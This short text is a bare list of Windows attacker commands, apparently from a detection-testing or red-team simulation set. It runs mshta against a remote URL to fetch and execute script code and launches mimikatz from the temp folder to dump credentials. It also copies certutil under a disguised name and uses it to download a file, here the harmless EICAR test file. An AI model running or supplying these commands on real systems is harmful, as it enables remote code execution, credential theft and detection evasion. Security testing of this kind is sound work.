mshta http://10.0.0.20:9994/9v0qx
%Temp%\mimikatz.exe
copy %windir%\system32\certutil.exe %temp%\cr.tmp
%temp%\cr.tmp -urlcache -split -f http://2016.eicar.org/download/eicar.com.txt %Temp%\eicar.com.txt

